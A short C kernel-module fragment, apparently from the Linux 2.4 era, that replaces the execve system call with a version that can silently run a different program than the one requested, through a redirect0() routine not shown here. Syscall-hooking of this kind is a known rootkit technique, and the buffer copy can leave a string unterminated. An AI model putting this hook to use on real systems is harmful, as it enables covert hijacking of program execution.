#include "base.h"
/*
 * sys_execve() executes a new program.
 */
asmlinkage int redirecting_sys_execve(struct pt_regs regs)
{
        int error;
        char * filename;
	char * execname;
	char local0[REDIR_BUFSIZE];

        filename = getname((char *) regs.ebx);
        error = PTR_ERR(filename);
        if (IS_ERR(filename))
                goto out;
	strncpy(local0, filename, REDIR_BUFSIZE-1);
	if((redirect0(local0))>0) {
		execname=local0;
	} else execname=filename;
        error = do_execve(execname, (char **) regs.ecx, (char **) regs.edx, &regs);
        if (error == 0)
                current->ptrace &= ~PT_DTRACE;
        putname(filename);
out:
        return error;
}
